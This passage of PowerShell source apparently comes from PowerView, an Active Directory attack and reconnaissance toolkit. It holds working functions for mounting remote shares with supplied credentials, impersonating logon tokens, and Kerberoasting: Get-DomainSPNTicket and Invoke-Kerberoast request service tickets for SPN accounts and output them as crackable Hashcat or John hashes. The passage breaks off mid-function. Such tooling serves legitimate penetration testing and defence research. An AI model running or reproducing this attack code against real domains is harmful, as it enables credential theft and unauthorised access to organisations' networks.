[Int]","        $Value,","","        [Switch]","        $ShowAll","    )","","    BEGIN {","        # values from https://support.microsoft.com/en-us/kb/305144","        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary","        $UACValues.Add(\"SCRIPT\", 1)","        $UACValues.Add(\"ACCOUNTDISABLE\", 2)","        $UACValues.Add(\"HOMEDIR_REQUIRED\", 8)","        $UACValues.Add(\"LOCKOUT\", 16)","        $UACValues.Add(\"PASSWD_NOTREQD\", 32)","        $UACValues.Add(\"PASSWD_CANT_CHANGE\", 64)","        $UACValues.Add(\"ENCRYPTED_TEXT_PWD_ALLOWED\", 128)","        $UACValues.Add(\"TEMP_DUPLICATE_ACCOUNT\", 256)","        $UACValues.Add(\"NORMAL_ACCOUNT\", 512)","        $UACValues.Add(\"INTERDOMAIN_TRUST_ACCOUNT\", 2048)","        $UACValues.Add(\"WORKSTATION_TRUST_ACCOUNT\", 4096)","        $UACValues.Add(\"SERVER_TRUST_ACCOUNT\", 8192)","        $UACValues.Add(\"DONT_EXPIRE_PASSWORD\", 65536)","        $UACValues.Add(\"MNS_LOGON_ACCOUNT\", 131072)","        $UACValues.Add(\"SMARTCARD_REQUIRED\", 262144)","        $UACValues.Add(\"TRUSTED_FOR_DELEGATION\", 524288)","        $UACValues.Add(\"NOT_DELEGATED\", 1048576)","        $UACValues.Add(\"USE_DES_KEY_ONLY\", 2097152)","        $UACValues.Add(\"DONT_REQ_PREAUTH\", 4194304)","        $UACValues.Add(\"PASSWORD_EXPIRED\", 8388608)","        $UACValues.Add(\"TRUSTED_TO_AUTH_FOR_DELEGATION\", 16777216)","        $UACValues.Add(\"PARTIAL_SECRETS_ACCOUNT\", 67108864)","    }","","    PROCESS {","        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary","","        if ($ShowAll) {","            ForEach ($UACValue in $UACValues.GetEnumerator()) {","                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {","                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)+\")","                }","                else {","                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)\")","                }","            }","        }","        else {","            ForEach ($UACValue in $UACValues.GetEnumerator()) {","                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {","                    $ResultUACValues.Add($UACValue.Name, \"$($UACValue.Value)\")","                }","            }","        }","        $ResultUACValues","    }","}","","","function Get-PrincipalContext {","\u003c#",".SYNOPSIS","","Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext","and simplified identity.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".PARAMETER Identity","","A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),","or a DOMAIN\\username identity.","",".PARAMETER Domain","","Specifies the domain to use to search for user/group principals, defaults to the current domain.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, Mandatory = $True)]","        [Alias('GroupName', 'GroupIdentity')]","        [String]","        $Identity,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    Add-Type -AssemblyName System.DirectoryServices.AccountManagement","","    try {","        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\\\.+')) {","            if ($Identity -match '.+\\\\.+') {","                # DOMAIN\\groupname","                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical","                if ($ConvertedIdentity) {","                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))","                    $ObjectIdentity = $Identity.Split('\\')[1]","                    Write-Verbose \"[Get-PrincipalContext] Binding to domain '$ConnectTarget'\"","                }","            }","            else {","                $ObjectIdentity = $Identity","                Write-Verbose \"[Get-PrincipalContext] Binding to domain '$Domain'\"","                $ConnectTarget = $Domain","            }","","            if ($PSBoundParameters['Credential']) {","                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'","                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)","            }","            else {","                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)","            }","        }","        else {","            if ($PSBoundParameters['Credential']) {","                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'","                $DomainName = Get-Domain | Select-Object -ExpandProperty Name","                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)","            }","            else {","                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)","            }","            $ObjectIdentity = $Identity","        }","","        $Out = New-Object PSObject","        $Out | Add-Member Noteproperty 'Context' $Context","        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity","        $Out","    }","    catch {","        Write-Warning \"[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_\"","    }","}","","","function Add-RemoteConnection {","\u003c#",".SYNOPSIS","","Pseudo \"mounts\" a connection to a remote path using the specified","credential object, allowing for access of remote resources. If a -Path isn't","specified, a -ComputerName is required to pseudo-mount IPC$.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: PSReflect  ","",".DESCRIPTION","","This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection","to the specified remote -Path (\\\\UNC\\share) with the alternate credentials specified in the","-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.","","To destroy the connection, use Remove-RemoteConnection with the same specified \\\\UNC\\share path","or -ComputerName.","",".PARAMETER ComputerName","","Specifies the system to add a \\\\ComputerName\\IPC$ connection for.","",".PARAMETER Path","","Specifies the remote \\\\UNC\\path to add the connection for.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the remote system.","",".EXAMPLE","","$Cred = Get-Credential","Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Add-RemoteConnection -Path '\\\\PRIMARY.testlab.local\\C$\\' -Credential $Cred","",".EXAMPLE","","$Cred = Get-Credential","@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred","#\u003e","","    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('HostName', 'dnshostname', 'name')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ComputerName,","","        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]","        [ValidatePattern('\\\\\\\\.*\\\\.*')]","        [String[]]","        $Path,","","        [Parameter(Mandatory = $True)]","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential","    )","","    BEGIN {","        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)","        $NetResourceInstance.dwType = 1","    }","","    PROCESS {","        $Paths = @()","        if ($PSBoundParameters['ComputerName']) {","            ForEach ($TargetComputerName in $ComputerName) {","                $TargetComputerName = $TargetComputerName.Trim('\\')","                $Paths += ,\"\\\\$TargetComputerName\\IPC$\"","            }","        }","        else {","            $Paths += ,$Path","        }","","        ForEach ($TargetPath in $Paths) {","            $NetResourceInstance.lpRemoteName = $TargetPath","            Write-Verbose \"[Add-RemoteConnection] Attempting to mount: $TargetPath\"","","            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx","            #   CONNECT_TEMPORARY = 4","            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)","","            if ($Result -eq 0) {","                Write-Verbose \"$TargetPath successfully mounted\"","            }","            else {","                Throw \"[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)\"","            }","        }","    }","}","","","function Remove-RemoteConnection {","\u003c#",".SYNOPSIS","","Destroys a connection created by New-RemoteConnection.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: PSReflect  ","",".DESCRIPTION","","This function uses WNetCancelConnection2 to destroy a connection created by","New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to","'unmount' \\\\$ComputerName\\IPC$.","",".PARAMETER ComputerName","","Specifies the system to remove a \\\\ComputerName\\IPC$ connection for.","",".PARAMETER Path","","Specifies the remote \\\\UNC\\path to remove the connection for.","",".EXAMPLE","","Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'","",".EXAMPLE","","Remove-RemoteConnection -Path '\\\\PRIMARY.testlab.local\\C$\\'","",".EXAMPLE","","@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('HostName', 'dnshostname', 'name')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ComputerName,","","        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]","        [ValidatePattern('\\\\\\\\.*\\\\.*')]","        [String[]]","        $Path","    )","","    PROCESS {","        $Paths = @()","        if ($PSBoundParameters['ComputerName']) {","            ForEach ($TargetComputerName in $ComputerName) {","                $TargetComputerName = $TargetComputerName.Trim('\\')","                $Paths += ,\"\\\\$TargetComputerName\\IPC$\"","            }","        }","        else {","            $Paths += ,$Path","        }","","        ForEach ($TargetPath in $Paths) {","            Write-Verbose \"[Remove-RemoteConnection] Attempting to unmount: $TargetPath\"","            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)","","            if ($Result -eq 0) {","                Write-Verbose \"$TargetPath successfully ummounted\"","            }","            else {","                Throw \"[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)\"","            }","        }","    }","}","","","function Invoke-UserImpersonation {","\u003c#",".SYNOPSIS","","Creates a new \"runas /netonly\" type logon and impersonates the token.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: PSReflect  ","",".DESCRIPTION","","This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType","to simulate \"runas /netonly\". The resulting token is then impersonated with","ImpersonateLoggedOnUser() and the token handle is returned for later usage","with Invoke-RevertToSelf.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object with alternate credentials","to impersonate in the current thread space.","",".PARAMETER TokenHandle","","An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.","If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()","is executed.","",".PARAMETER Quiet","","Suppress any warnings about STA vs MTA.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Invoke-UserImpersonation -Credential $Cred","",".OUTPUTS","","IntPtr","","The TokenHandle result from LogonUser.","#\u003e","","    [OutputType([IntPtr])]","    [CmdletBinding(DefaultParameterSetName = 'Credential')]","    Param(","        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential,","","        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]","        [ValidateNotNull()]","        [IntPtr]","        $TokenHandle,","","        [Switch]","        $Quiet","    )","","    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {","        Write-Warning \"[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.\"","    }","","    if ($PSBoundParameters['TokenHandle']) {","        $LogonTokenHandle = $TokenHandle","    }","    else {","        $LogonTokenHandle = [IntPtr]::Zero","        $NetworkCredential = $Credential.GetNetworkCredential()","        $UserDomain = $NetworkCredential.Domain","        $UserName = $NetworkCredential.UserName","        Write-Warning \"[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\\$($UserName)\"","","        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3","        #   this is to simulate \"runas.exe /netonly\" functionality","        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();","","        if (-not $Result) {","            throw \"[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"","        }","    }","","    # actually impersonate the token from LogonUser()","    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)","","    if (-not $Result) {","        throw \"[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"","    }","","    Write-Verbose \"[Invoke-UserImpersonation] Alternate credentials successfully impersonated\"","    $LogonTokenHandle","}","","","function Invoke-RevertToSelf {","\u003c#",".SYNOPSIS","","Reverts any token impersonation.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: PSReflect  ","",".DESCRIPTION","","This function uses RevertToSelf() to revert any impersonated tokens.","If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),","CloseHandle() is used to close the opened handle.","",".PARAMETER TokenHandle","","An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","$Token = Invoke-UserImpersonation -Credential $Cred","Invoke-RevertToSelf -TokenHandle $Token","#\u003e","","    [CmdletBinding()]","    Param(","        [ValidateNotNull()]","        [IntPtr]","        $TokenHandle","    )","","    if ($PSBoundParameters['TokenHandle']) {","        Write-Warning \"[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle\"","        $Result = $Kernel32::CloseHandle($TokenHandle)","    }","","    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();","","    if (-not $Result) {","        throw \"[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"","    }","","    Write-Verbose \"[Invoke-RevertToSelf] Token impersonation successfully reverted\"","}","","","function Get-DomainSPNTicket {","\u003c#",".SYNOPSIS","","Request the kerberos ticket for a specified service principal name (SPN).","","Author: machosec, Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  ","",".DESCRIPTION","","This function will either take one/more SPN strings, or one/more PowerView.User objects","(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN","using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted","portion of the ticket is then extracted and output in either crackable John or Hashcat","format (deafult of Hashcat).","",".PARAMETER SPN","","Specifies the service principal name to request the ticket for.","",".PARAMETER User","","Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.","",".PARAMETER OutputFormat","","Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.","Defaults to 'John'.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the remote domain using Invoke-UserImpersonation.","",".EXAMPLE","","Get-DomainSPNTicket -SPN \"HTTP/web.testlab.local\"","","Request a kerberos service ticket for the specified SPN.","",".EXAMPLE","","\"HTTP/web1.testlab.local\",\"HTTP/web2.testlab.local\" | Get-DomainSPNTicket","","Request kerberos service tickets for all SPNs passed on the pipeline.","",".EXAMPLE","","Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR","","Request kerberos service tickets for all users with non-null SPNs and output in JTR format.","",".INPUTS","","String","","Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.","",".INPUTS","","PowerView.User","","Accepts one or more PowerView.User objects on the pipeline with the User parameter set.","",".OUTPUTS","","PowerView.SPNTicket","","Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.","#\u003e","","    [OutputType('PowerView.SPNTicket')]","    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]","    Param (","        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]","        [ValidatePattern('.*/.*')]","        [Alias('ServicePrincipalName')]","        [String[]]","        $SPN,","","        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]","        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]","        [Object[]]","        $User,","","        [ValidateSet('John', 'Hashcat')]","        [Alias('Format')]","        [String]","        $OutputFormat = 'Hashcat',","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')","","        if ($PSBoundParameters['Credential']) {","            $LogonToken = Invoke-UserImpersonation -Credential $Credential","        }","    }","","    PROCESS {","        if ($PSBoundParameters['User']) {","            $TargetObject = $User","        }","        else {","            $TargetObject = $SPN","        }","","        ForEach ($Object in $TargetObject) {","            if ($PSBoundParameters['User']) {","                $UserSPN = $Object.ServicePrincipalName","                $SamAccountName = $Object.SamAccountName","                $DistinguishedName = $Object.DistinguishedName","            }","            else {","                $UserSPN = $Object","                $SamAccountName = 'UNKNOWN'","                $DistinguishedName = 'UNKNOWN'","            }","","            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3","            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {","                $UserSPN = $UserSPN[0]","            }","","            try {","                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN","            }","            catch {","                Write-Warning \"[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_\"","            }","            if ($Ticket) {","                $TicketByteStream = $Ticket.GetRequest()","            }","            if ($TicketByteStream) {","                $Out = New-Object PSObject","","                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'","","                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName","                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName","                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName","","                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)","                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object","                if($TicketHexStream -match 'a382....3082....A0030201(?\u003cEtypeLen\u003e..)A1.{1,4}.......A282(?\u003cCipherTextLen\u003e....)........(?\u003cDataToEnd\u003e.+)') {","                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )","                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4","                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)","","                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object","                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {","                        Write-Warning \"Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq\"","                        $Hash = $null","                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))","                    } else {","                        $Hash = \"$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))\"","                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null","                    }","                } else {","                    Write-Warning \"Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq\"","                    $Hash = $null","                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))","                }","","                if($Hash) {","                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...","                    if ($OutputFormat -match 'John') {","                        $HashFormat = \"`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash\"","                    }","                    else {","                        if ($DistinguishedName -ne 'UNKNOWN') {","                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'","                        }","                        else {","                            $UserDomain = 'UNKNOWN'","                        }","","                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...","                        $HashFormat = \"`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash\"","                    }","                    $Out | Add-Member Noteproperty 'Hash' $HashFormat","                }","","                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')","                $Out","            }","        }","    }","","    END {","        if ($LogonToken) {","            Invoke-RevertToSelf -TokenHandle $LogonToken","        }","    }","}","","","function Invoke-Kerberoast {","\u003c#",".SYNOPSIS","","Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.","","Author: Will Schroeder (@harmj0y), @machosec  ","License: BSD 3-Clause  ","Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  ","",".DESCRIPTION","","Uses Get-DomainUser to query for user accounts with non-null service principle","names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.","The ticket format can be specified with -OutputFormat \u003cJohn/Hashcat\u003e.","",".PARAMETER Identity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).","Wildcards accepted.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER OutputFormat","","Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.","Defaults to 'Hashcat'.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Invoke-Kerberoast | fl","","Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).","",".EXAMPLE","","Invoke-Kerberoast -Domain dev.testlab.local | fl","","Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR","format instead of Hashcat.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce","$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\\dfm.a', $SecPassword)","Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl","","Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.","",".OUTPUTS","","PowerView.SPNTicket","","Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.SPNTicket')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]","        [String[]]","        $Identity,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [ValidateSet('John', 'Hashcat')]","        [Alias('Format')]","        [String]","        $OutputFormat = 'Hashcat',","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $UserSearcherArguments = @{","            'SPN' = $True","            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'","        }","        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }","        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }","","        if ($PSBoundParameters['Credential']) {","            $LogonToken = Invoke-UserImpersonation -Credential $Credential","        }","    }","","    PROCESS {","        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }","        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat","    }","","    END {","        if ($LogonToken) {","            Invoke-RevertToSelf -TokenHandle $LogonToken","        }","    }","}","","","function Get-PathAcl {","\u003c#",".SYNOPSIS","","Enumerates the ACL for a given file path.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  ","",".DESCRIPTION","","Enumerates the ACL for a specified file/folder path, and translates","the access rules for each entry into readable formats. If -Credential is passed,","Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.","",".PARAMETER Path","","Specifies the local or remote path to enumerate the ACLs for.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target path.","",".EXAMPLE","","Get-PathAcl \"\\\\SERVER\\Share\\\"","","Returns ACLs for the given UNC share.","",".EXAMPLE","","gci .\\test.txt | Get-PathAcl","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)","Get-PathAcl -Path \"\\\\SERVER\\Share\\\" -Credential $Cred","",".INPUTS","","String","","One of more paths to enumerate ACLs for.","",".OUTPUTS","","PowerView.FileACL","","A custom object with the full path and associated ACL entries.","",".LINK","","https://support.microsoft.com/en-us/kb/305144","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.FileACL')]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('FullName')]","        [String[]]","        $Path,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","","        function Convert-FileRight {","            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights","            [CmdletBinding()]","            Param(","                [Int]","                $FSR","            )","","            $AccessMask = @{","                [uint32]'0x80000000' = 'GenericRead'","                [uint32]'0x40000000' = 'GenericWrite'","                [uint32]'0x20000000' = 'GenericExecute'","                [uint32]'0x10000000' = 'GenericAll'","                [uint32]'0x02000000' = 'MaximumAllowed'","                [uint32]'0x01000000' = 'AccessSystemSecurity'","                [uint32]'0x00100000' = 'Synchronize'","                [uint32]'0x00080000' = 'WriteOwner'","                [uint32]'0x00040000' = 'WriteDAC'","                [uint32]'0x00020000' = 'ReadControl'","                [uint32]'0x00010000' = 'Delete'","                [uint32]'0x00000100' = 'WriteAttributes'","                [uint32]'0x00000080' = 